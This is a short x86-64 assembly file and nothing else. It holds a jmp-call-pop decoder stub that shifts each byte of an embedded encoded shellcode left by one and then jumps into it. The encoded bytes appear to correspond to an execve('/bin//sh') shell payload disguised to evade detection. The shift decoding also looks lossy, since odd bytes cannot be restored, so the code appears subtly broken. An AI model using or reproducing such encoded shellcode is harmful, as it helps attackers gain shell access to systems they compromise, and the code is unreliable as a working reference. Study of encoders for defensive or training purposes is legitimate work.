global _start
section .text
_start:

jmp store_address 

decoder: 
	pop rdi
	shl rcx, 1
	add cl, 33

decode:
	shl byte [rdi] ,1
	inc rdi
	loop decode
	jmp encoded_shellcode

store_address:

	call decoder
	encoded_shellcode: db 0x24,0x18,0x60,0x28,0x24,0x5d,0x17,0x17,0x31,0x34,0x37,0x17,0x39,0x34,0x29,0x24,0x44,0x73,0x28,0x24,0x44,0x71,0x28,0x24,0x44,0x73,0x24,0x18,0x60,0x58,0x1d,0x07,0x02
